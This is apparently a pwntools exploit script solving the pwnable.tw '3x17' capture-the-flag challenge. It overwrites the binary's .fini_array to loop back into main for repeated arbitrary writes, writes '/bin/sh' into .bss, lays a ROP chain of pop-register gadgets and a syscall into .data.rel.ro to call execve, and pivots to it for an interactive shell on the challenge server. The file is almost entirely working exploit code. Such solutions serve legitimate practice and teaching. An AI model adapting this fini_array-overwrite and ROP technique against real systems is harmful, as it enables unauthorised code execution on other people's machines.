from pwn import *

p = process("./3x17")
context.log_level = "DEBUG"
p = remote("chall.pwnable.tw",10105)
fini_array = 0x00000000004b40f0
__libc_csu_fini = 0x00000000402960
main = 0x00000000401B6D
syscall = 0x00000000004022b4
pop_rdi_ret = 0x0000000000401696
pop_rsi_ret = 0x0000000000406c30
pop_rdx_ret = 0x0000000000446e35
pop_rax_ret = 0x000000000041e4af

bss = 0x0000000004B97E2
data_relro = 0x0000000004B4100
'''

overwrite process
ROP chain

fini arrray __libc_csu_fini+main
esp    pop rax
esp+8  0x3b
esp+16 poprdi
esp+24 binsh_addr
esp+32 pop rsi
esp+40 0
esp+48 pop rdx
esp+56 0
esp+64 syscall
fini leave_ret
'''

def write(addr,data):
    p.sendlineafter('addr',str(addr))
    p.sendafter("data:",data)

write(fini_array,p64(__libc_csu_fini)+p64(main))

write(bss, b"/bin/sh\x00")
write(data_relro,p64(pop_rax_ret))
write(data_relro+8,p64(0x3b))
write(data_relro+16,p64(pop_rdi_ret))
write(data_relro+24,p64(bss))
write(data_relro+32,p64(pop_rsi_ret))
write(data_relro+40,p64(0))
write(data_relro+48,p64(pop_rdx_ret))
write(data_relro+56,p64(0))
write(data_relro+64,p64(syscall))
write(fini_array,p64(0x0000000000401c4b))
p.interactive()
